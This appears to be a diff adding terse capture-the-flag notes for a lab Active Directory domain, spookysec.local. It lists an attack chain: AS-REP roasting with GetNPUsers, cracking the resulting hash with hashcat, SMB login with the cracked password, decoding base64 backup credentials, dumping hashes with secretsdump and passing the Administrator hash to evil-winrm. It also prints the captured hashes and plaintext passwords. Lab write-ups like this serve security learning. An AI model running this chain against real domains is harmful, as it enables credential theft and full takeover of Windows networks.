@@ -1,0 +1,20 @@
+python3 GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
+
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:83bef2c3d51cf0edebda6cc1ce15994f$65e416116dc8e70e8989f71c0797fc705ff23c79b5f07fba9a6d63791f5a67fc2920d396bf37a92fb173a0358c0694d61aeaa5da4767409688aeb61f1387e2a79ad041ee237f413c48a7d6bcd4edea6880594fa3e2b2ddf174f07e2d4336452878dc699e174bdf58b90d7ac6a6b4f76cdfb261102f0003f1f90c1402d17f5cbc45f398a5e83607cca4b7e057375dc2d9327abbece9d6fc22aee395f0b081b9f236f22ef3ff1c64ce969641408d6b2716b5bcc4032b2e12f43aa848aeca9c5788afec2b5ea6ac1d30e2debe7afb26207124432ee017e04e85b8174b34ac4591d1986c26d2cb005970364cf6ffd0ec01672ce1
+
+
+hashcat -a 0 -m 18200 hash /root/Desktop/wordlists --force
+
+found management2005
+smbclient -L \\\\10.10.102.134\\ -U 'svc-admin' -P 'management2005'
+
+found backup_credential.txt : base64
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+backup@spookysec.local:backup2517860
+
+python3 secretsdump.py -dc-ip spookysec.local backup:backup251786@spookysec.local
+0e0363213e37b94221497260b0bcb4fc
+
+evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i spookysec.local
+
+done. you are an admin. u can pawn the flag.
